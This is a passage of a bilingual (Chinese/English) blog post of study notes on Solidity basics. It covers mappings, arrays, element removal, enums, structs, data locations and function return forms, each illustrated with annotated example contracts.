break</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// while loop</span></span><br><span class="line">        uint j;</span><br><span class="line">        <span class="keyword">while</span> (j &lt; <span class="number">10</span>) &#123;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Mapping</h1>
<p>Maps are created with the syntax mapping(keyType =&gt; valueType).<br />
<strong>The keyType can be any built-in value type</strong>, bytes, string, or any contract.</p>
<blockquote>
<p>TODO:哪些是类型可以做Key？常用用什么做key?</p>
</blockquote>
<p>valueType can be any type including another mapping or an array.<br />
Mappings are not iterable.</p>
<p>Array Vs 哈希表：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Array:没有目录的字典</p>
</li>
<li class="lvl-2">
<p>哈希表:有目录的字典</p>
</li>
</ul>
<p>在数组中如果要找一个单词，由于不知道我们在哪个位置，所以只能从头开始查询（又称线性查找），数据量越大越难查。想想不用手写字母作为索引，直接去字典里翻找字典多麻烦。。。在哈希表中，有Key作为标识符，按图索骥,找东西就快很多。在数据存储上的灵活性和数据查询上的高效性,适合用来存用于余额等数据。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Mapping</span> &#123;</span><br><span class="line">    <span class="comment">// Mapping from address to uint</span></span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint) public myMap;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">get</span>(<span class="params">address _addr</span>) public view returns (uint) &#123;</span><br><span class="line">        <span class="comment">// Mapping always returns a value.</span></span><br><span class="line">        <span class="comment">// If the value was never set, it will return the default value.</span></span><br><span class="line">        <span class="keyword">return</span> myMap[_addr];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">set</span>(<span class="params">address _addr, uint _i</span>) public &#123;</span><br><span class="line">        <span class="comment">// Update the value at this address</span></span><br><span class="line">        myMap[_addr] = _i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">remove</span>(<span class="params">address _addr</span>) public &#123;</span><br><span class="line">        <span class="comment">// Reset the value to the default value.</span></span><br><span class="line">        <span class="keyword">delete</span> myMap[_addr];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">NestedMapping</span> &#123;</span><br><span class="line">    <span class="comment">// Nested mapping (mapping from address to another mapping)</span></span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> <span class="title function_">mapping</span>(<span class="function"><span class="params">uint</span> =&gt;</span> bool)) public nested;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">get</span>(<span class="params">address _addr1, uint _i</span>) public view returns (bool) &#123;</span><br><span class="line">        <span class="comment">// You can get values from a nested mapping</span></span><br><span class="line">        <span class="comment">// even when it is not initialized</span></span><br><span class="line">        <span class="keyword">return</span> nested[_addr1][_i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">set</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address _addr1,</span></span><br><span class="line"><span class="params">        uint _i,</span></span><br><span class="line"><span class="params">        bool _boo</span></span><br><span class="line"><span class="params">    </span>) public &#123;</span><br><span class="line">        nested[_addr1][_i] = _boo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">remove</span>(<span class="params">address _addr1, uint _i</span>) public &#123;</span><br><span class="line">        <span class="keyword">delete</span> nested[_addr1][_i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Array：</h1>
<p>Array can have a compile-time fixed size or a dynamic size.<br />
固定长度或动态长度。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Array</span> &#123;</span><br><span class="line">    <span class="comment">// Several ways to initialize an array</span></span><br><span class="line">    <span class="comment">// 多种方式初始化</span></span><br><span class="line">    uint[] public arr;</span><br><span class="line">    uint[] public arr2 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">    <span class="comment">// Fixed sized array, all elements initialize to 0</span></span><br><span class="line">    uint[<span class="number">10</span>] public myFixedSizeArr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">get</span>(<span class="params">uint i</span>) public view returns (uint) &#123;</span><br><span class="line">        <span class="keyword">return</span> arr[i]; <span class="comment">// 通过下标去找</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Solidity can return the entire array. 能返回整个数组，但避免能无限长的数组。</span></span><br><span class="line">    <span class="comment">// But this function should be avoided for</span></span><br><span class="line">    <span class="comment">// arrays that can grow indefinitely in length.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getArr</span>(<span class="params"></span>) public view returns (uint[] memory) &#123;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">push</span>(<span class="params">uint i</span>) public &#123;</span><br><span class="line">        <span class="comment">// Append to array</span></span><br><span class="line">        <span class="comment">// This will increase the array length by 1. // 长度+1</span></span><br><span class="line">        arr.<span class="title function_">push</span>(i); <span class="comment">// 在尾端加入，追加</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">pop</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="comment">// Remove last element from array</span></span><br><span class="line">        <span class="comment">// This will decrease the array length by 1 // 长度-1</span></span><br><span class="line">        arr.<span class="title function_">pop</span>(); <span class="comment">// 在尾端去除</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getLength</span>(<span class="params"></span>) public view returns (uint) &#123;</span><br><span class="line">        <span class="keyword">return</span> arr.<span class="property">length</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">remove</span>(<span class="params">uint index</span>) public &#123;</span><br><span class="line">        <span class="comment">// Delete does not change the array length. 不改变数组长度，仅设为默认值</span></span><br><span class="line">        <span class="comment">// It resets the value at index to it&#x27;s default value,</span></span><br><span class="line">        <span class="comment">// in this case 0</span></span><br><span class="line">        <span class="keyword">delete</span> arr[index]; <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">examples</span>(<span class="params"></span>) external &#123;</span><br><span class="line">        <span class="comment">// create array in memory, only fixed size can be created</span></span><br><span class="line">        uint[] memory a = <span class="keyword">new</span> uint[](<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Examples of removing array element</p>
<h2 id="Remove-array-element-by-shifting-elements-from-right-to-left">Remove array element by shifting elements from right to left</h2>
<p>自带的<code>delete arr[index];</code>不改变数组长度，仅把要删除的位置的 值 设为默认值，会有“脏数据”。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"><span class="comment">// 在要删除索引的位置，之后的值依次向前覆盖,再pop掉最后一个元素</span></span><br><span class="line">contract <span class="title class_">ArrayRemoveByShifting</span> &#123;</span><br><span class="line">    <span class="comment">// [1, 2, 3] -- remove(1) --&gt; [1, 3, 3] --&gt; [1, 3]</span></span><br><span class="line">    <span class="comment">// [1, 2, 3, 4, 5, 6] -- remove(2) --&gt; [1, 2, 4, 5, 6, 6] --&gt; [1, 2, 4, 5, 6]</span></span><br><span class="line">    <span class="comment">// [1, 2, 3, 4, 5, 6] -- remove(0) --&gt; [2, 3, 4, 5, 6, 6] --&gt; [2, 3, 4, 5, 6]</span></span><br><span class="line">    <span class="comment">// [1] -- remove(0) --&gt; [1] --&gt; []</span></span><br><span class="line"></span><br><span class="line">    uint[] public arr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">remove</span>(<span class="params">uint _index</span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(_index &lt; arr.<span class="property">length</span>, <span class="string">&quot;index out of bound&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (uint i = _index; i &lt; arr.<span class="property">length</span> - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            arr[i] = arr[i + <span class="number">1</span>]; <span class="comment">// 在要删除索引的位置，之后的值依次向前覆盖</span></span><br><span class="line">        &#125;</span><br><span class="line">        arr.<span class="title function_">pop</span>();<span class="comment">// </span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) external &#123;</span><br><span class="line">        arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">        <span class="title function_">remove</span>(<span class="number">2</span>); <span class="comment">// 删除值为3的元素</span></span><br><span class="line">        <span class="comment">// [1, 2, 4, 5]</span></span><br><span class="line">        <span class="title function_">assert</span>(arr[<span class="number">0</span>] == <span class="number">1</span>);</span><br><span class="line">        <span class="title function_">assert</span>(arr[<span class="number">1</span>] == <span class="number">2</span>);</span><br><span class="line">        <span class="title function_">assert</span>(arr[<span class="number">2</span>] == <span class="number">4</span>);</span><br><span class="line">        <span class="title function_">assert</span>(arr[<span class="number">3</span>] == <span class="number">5</span>);</span><br><span class="line">        <span class="title function_">assert</span>(arr.<span class="property">length</span> == <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        arr = [<span class="number">1</span>];</span><br><span class="line">        <span class="title function_">remove</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">// []</span></span><br><span class="line">        <span class="title function_">assert</span>(arr.<span class="property">length</span> == <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Remove-array-element-by-copying-last-element-into-to-the-place-to-remove">Remove array element by copying last element into to the place to remove</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"><span class="comment">// 用最后一个元素 覆盖 要函数的元素</span></span><br><span class="line">contract <span class="title class_">ArrayReplaceFromEnd</span> &#123;</span><br><span class="line">    uint[] public arr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Deleting an element creates a gap in the array.</span></span><br><span class="line">    <span class="comment">// One trick to keep the array compact is to</span></span><br><span class="line">    <span class="comment">// move the last element into the place to delete.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">remove</span>(<span class="params">uint index</span>) public &#123;</span><br><span class="line">        <span class="comment">// Move the last element into the place to delete</span></span><br><span class="line">        arr[index] = arr[arr.<span class="property">length</span> - <span class="number">1</span>];</span><br><span class="line">        <span class="comment">// Remove the last element</span></span><br><span class="line">        arr.<span class="title function_">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">        <span class="title function_">remove</span>(<span class="number">1</span>); <span class="comment">// 删除值为2的元素</span></span><br><span class="line">        <span class="comment">// [1, 4, 3]</span></span><br><span class="line">        <span class="title function_">assert</span>(arr.<span class="property">length</span> == <span class="number">3</span>);</span><br><span class="line">        <span class="title function_">assert</span>(arr[<span class="number">0</span>] == <span class="number">1</span>);</span><br><span class="line">        <span class="title function_">assert</span>(arr[<span class="number">1</span>] == <span class="number">4</span>);</span><br><span class="line">        <span class="title function_">assert</span>(arr[<span class="number">2</span>] == <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">        <span class="title function_">remove</span>(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">// [1, 4]</span></span><br><span class="line">        <span class="title function_">assert</span>(arr.<span class="property">length</span> == <span class="number">2</span>);</span><br><span class="line">        <span class="title function_">assert</span>(arr[<span class="number">0</span>] == <span class="number">1</span>);</span><br><span class="line">        <span class="title function_">assert</span>(arr[<span class="number">1</span>] == <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Enum:</h1>
<p>Solidity supports enumerables and they are useful to model choice and keep track of state.<br />
单选项，适合来表示状态,主要用于为<code>uint</code>分配名称，使程序易于阅读和维护<br />
Enums can be declared outside of a contract.枚举类型可以在合约外定义</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Enum</span> &#123;</span><br><span class="line">    <span class="comment">// Enum representing shipping status</span></span><br><span class="line">    enum <span class="title class_">Status</span> &#123;</span><br><span class="line">        <span class="title class_">Pending</span>,</span><br><span class="line">        <span class="title class_">Shipped</span>,</span><br><span class="line">        <span class="title class_">Accepted</span>,</span><br><span class="line">        <span class="title class_">Rejected</span>,</span><br><span class="line">        <span class="title class_">Canceled</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Default value is the first element listed in</span></span><br><span class="line">    <span class="comment">// definition of the type, in this case &quot;Pending&quot;</span></span><br><span class="line">    <span class="title class_">Status</span> public status;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Returns uint</span></span><br><span class="line">    <span class="comment">// Pending  - 0</span></span><br><span class="line">    <span class="comment">// Shipped  - 1</span></span><br><span class="line">    <span class="comment">// Accepted - 2</span></span><br><span class="line">    <span class="comment">// Rejected - 3</span></span><br><span class="line">    <span class="comment">// Canceled - 4</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">get</span>(<span class="params"></span>) public view returns (<span class="title class_">Status</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update status by passing uint into input</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">set</span>(<span class="params">Status _status</span>) public &#123;</span><br><span class="line">        status = _status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// You can update to a specific enum like this</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">cancel</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        status = <span class="title class_">Status</span>.<span class="property">Canceled</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// delete resets the enum to its first value, 0</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">reset</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="keyword">delete</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220713193040.png" alt="20220713193040" /><br />
设置和获取的都是无符号整数型</p>
<h2 id="合约外定义：">合约外定义：</h2>
<p>Declaring and importing Enum File that the enum is declared in</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"><span class="comment">// This is saved &#x27;EnumDeclaration.sol&#x27;</span></span><br><span class="line"></span><br><span class="line">enum <span class="title class_">Status</span> &#123;</span><br><span class="line">    <span class="title class_">Pending</span>,</span><br><span class="line">    <span class="title class_">Shipped</span>,</span><br><span class="line">    <span class="title class_">Accepted</span>,</span><br><span class="line">    <span class="title class_">Rejected</span>,</span><br><span class="line">    <span class="title class_">Canceled</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">File</span> that imports the enum above</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./EnumDeclaration.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Enum</span> &#123;</span><br><span class="line">    <span class="title class_">Status</span> public status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Structs:</h1>
<p>You can define your own type by creating a struct.自定义类型,形式上与<code>enum</code>相似，但可以比enum定义更多的类型<br />
They are useful for grouping together related data. 组织数据<br />
Structs can be declared outside of a contract and imported in another contract.</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Todos</span> &#123;</span><br><span class="line">    struct <span class="title class_">Todo</span> &#123;</span><br><span class="line">        string text;</span><br><span class="line">        bool completed;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// An array of &#x27;Todo&#x27; structs</span></span><br><span class="line">    <span class="title class_">Todo</span>[] public todos;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">create</span>(<span class="params">string memory _text</span>) public &#123;</span><br><span class="line">        <span class="comment">// 3 ways to initialize a struct</span></span><br><span class="line">        <span class="comment">// - calling it like a function</span></span><br><span class="line">        todos.<span class="title function_">push</span>(<span class="title class_">Todo</span>(_text, <span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// key value mapping</span></span><br><span class="line">        todos.<span class="title function_">push</span>(<span class="title class_">Todo</span>(&#123;<span class="attr">text</span>: _text, <span class="attr">completed</span>: <span class="literal">false</span>&#125;));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// initialize an empty struct and then update it</span></span><br><span class="line">        <span class="title class_">Todo</span> memory todo;</span><br><span class="line">        todo.<span class="property">text</span> = _text;</span><br><span class="line">        <span class="comment">// todo.completed initialized to false</span></span><br><span class="line"></span><br><span class="line">        todos.<span class="title function_">push</span>(todo);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Solidity automatically created a getter for &#x27;todos&#x27; so</span></span><br><span class="line">    <span class="comment">// you don&#x27;t actually need this function.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">get</span>(<span class="params">uint _index</span>) public view returns (string memory text, bool completed) &#123;</span><br><span class="line">        <span class="title class_">Todo</span> storage todo = todos[_index];</span><br><span class="line">        <span class="keyword">return</span> (todo.<span class="property">text</span>, todo.<span class="property">completed</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// update text</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">update</span>(<span class="params">uint _index, string memory _text</span>) public &#123;</span><br><span class="line">        <span class="title class_">Todo</span> storage todo = todos[_index];</span><br><span class="line">        todo.<span class="property">text</span> = _text;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// update completed</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">toggleCompleted</span>(<span class="params">uint _index</span>) public &#123;</span><br><span class="line">        <span class="title class_">Todo</span> storage todo = todos[_index];</span><br><span class="line">        todo.<span class="property">completed</span> = !todo.<span class="property">completed</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220713194303.png" alt="20220713194303" /><br />
用index取值</p>
<h2 id="导入struct：">导入struct：</h2>
<p>Declaring and importing Struct File that the struct is declared in</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">struct <span class="title class_">Todo</span> &#123;</span><br><span class="line">    string text;</span><br><span class="line">    bool completed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>File that imports the struct above</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./StructDeclaration.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Todos</span> &#123;</span><br><span class="line">    <span class="comment">// An array of &#x27;Todo&#x27; structs</span></span><br><span class="line">    <span class="title class_">Todo</span>[] public todos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Data Locations - Storage, Memory and Calldata:</h1>
<p>Variables are declared as either <code>storage</code>, <code>memory</code> or <code>calldata</code> to explicitly specify the location of the data.<br />
定义数据存储的位置</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>storage</code> - variable is a state variable (store on blockchain) World State变量😆，存在链上</p>
</li>
<li class="lvl-2">
<p><code>memory</code> - variable is in memory and it exists while a function is being called 函数里的临时变量</p>
</li>
<li class="lvl-2">
<p><code>calldata</code> - special data location that contains function arguments 用于函数参数</p>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">DataLocations</span> &#123;</span><br><span class="line">    uint[] public arr;</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">uint</span> =&gt;</span> address) map;</span><br><span class="line">    struct <span class="title class_">MyStruct</span> &#123;</span><br><span class="line">        uint foo;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">uint</span> =&gt;</span> <span class="title class_">MyStruct</span>) myStructs;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="comment">// call _f with state variables</span></span><br><span class="line">        <span class="title function_">_f</span>(arr, map, myStructs[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// get a struct from a mapping</span></span><br><span class="line">        <span class="comment">// &#123;Type&#125; &#123;Location&#125; &#123;VariableName&#125; 😤😤😤</span></span><br><span class="line">        <span class="title class_">MyStruct</span> storage myStruct = myStructs[<span class="number">1</span>];</span><br><span class="line">        <span class="comment">// create a struct in memory</span></span><br><span class="line">        <span class="title class_">MyStruct</span> memory myMemStruct = <span class="title class_">MyStruct</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_f</span>(<span class="params"></span></span><br><span class="line"><span class="params">        uint[] storage _arr,</span></span><br><span class="line"><span class="params">        mapping(uint =&gt; address) storage _map,</span></span><br><span class="line"><span class="params">        MyStruct storage _myStruct</span></span><br><span class="line"><span class="params">    </span>) internal &#123;</span><br><span class="line">        <span class="comment">// do something with storage variables</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// You can return memory variables</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">g</span>(<span class="params">uint[] memory _arr</span>) public returns (uint[] memory) &#123;</span><br><span class="line">        <span class="comment">// do something with memory array</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">h</span>(<span class="params">uint[] calldata _arr</span>) external &#123;</span><br><span class="line">        <span class="comment">// do something with calldata array</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>没有解释得很清楚😕 ，需要例子不是很清楚什么时候用<code>calldata</code></p>
<h1>Function:</h1>
<p>There are several ways to return outputs from a function.  return的多种情况<br />
Public functions cannot accept certain data types as inputs or outputs</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Function</span> &#123;</span><br><span class="line">    <span class="comment">// Functions can return multiple values. </span></span><br><span class="line">    <span class="comment">// 一次能返回多个数据</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">returnMany</span>(<span class="params"></span>)</span><br><span class="line">        public</span><br><span class="line">        pure</span><br><span class="line">        returns (</span><br><span class="line">            uint,</span><br><span class="line">            bool,</span><br><span class="line">            uint</span><br><span class="line">        )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>, <span class="literal">true</span>, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return values can be named. </span></span><br><span class="line">    <span class="comment">// 返回值可以命名</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">named</span>(<span class="params"></span>)</span><br><span class="line">        public</span><br><span class="line">        pure</span><br><span class="line">        returns (</span><br><span class="line">            uint x,</span><br><span class="line">            bool b,</span><br><span class="line">            uint y</span><br><span class="line">        )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>, <span class="literal">true</span>, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return values can be assigned to their name.</span></span><br><span class="line">    <span class="comment">// In this case the return statement can be omitted. </span></span><br><span class="line">    <span class="comment">// 提前声明返回值，可省略返回语句，隐式返回</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">assigned</span>(<span class="params"></span>)</span><br><span class="line">        public</span><br><span class="line">        pure</span><br><span class="line">        returns (</span><br><span class="line">            uint x,</span><br><span class="line">            bool b,</span><br><span class="line">            uint y</span><br><span class="line">        )</span><br><span class="line">    &#123;</span><br><span class="line">        x = <span class="number">1</span>;</span><br><span class="line">        b = <span class="literal">true</span>;</span><br><span class="line">        y = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Use destructuring assignment when calling another</span></span><br><span class="line">    <span class="comment">// function that returns multiple values.</span></span><br><span class="line">    <span class="comment">// 非结构化赋值</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">destructuringAssignments</span>(<span class="params"></span>)</span><br><span class="line">        public</span><br><span class="line">        pure</span><br><span class="line">        returns (</span><br><span class="line">            uint,</span><br><span class="line">            bool,</span><br><span class="line">            uint,</span><br><span class="line">            uint,</span><br><span class="line">            uint</span><br><span class="line">        )</span><br><span class="line">    &#123;</span><br><span class="line">        (uint i, bool b, uint j) = <span class="title function_">returnMany</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Values can be left out.  </span></span><br><span class="line">        <span class="comment">// 非结构化赋值</span></span><br><span class="line">        <span class="comment">// 空开</span></span><br><span class="line">        (uint x, , uint y) = (<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (i, b, j, x, y);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Cannot use map for either input or output</span></span><br><span class="line">    <span class="comment">// map不能作为输入或输出</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Can use array for input</span></span><br><span class="line">    <span class="comment">// 数组可作为输入</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">arrayInput</span>(<span class="params">uint[] memory _arr</span>) public &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Can use array for output</span></span><br><span class="line">    <span class="comment">// 数组可作为输出</span></span><br><span class="line">    uint[] public arr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">arrayOutput</span>(<span class="params"></span>) public view returns (uint[] memory) &#123;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>View and Pure Functions:</h1>
<p><code>Getter</code> functions can be declared <code>view</code> or <code>pure</code>.<br />
<code>View</code> function declares that no state will be changed. 没有world State变量会改变<br />
<code>Pure</code> function declares that no state variable will be changed or read. 没有world State变量会改变或读取</p>
